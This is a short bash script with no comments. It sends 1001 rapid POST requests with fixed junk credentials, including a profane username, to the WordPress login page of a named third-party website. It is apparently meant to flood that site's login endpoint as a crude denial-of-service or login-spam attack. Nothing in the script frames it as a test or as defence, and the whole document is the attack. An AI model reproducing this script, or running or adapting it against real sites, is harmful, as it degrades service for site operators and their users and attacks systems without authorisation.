#!/bin/bash

for i in {0..1000}
  do
  curl -F "log=fuckuo&pwd=234234432&redirect_to=&wp-submit=submit" http://www.4-a.ir/wp-login.php -m 1
done
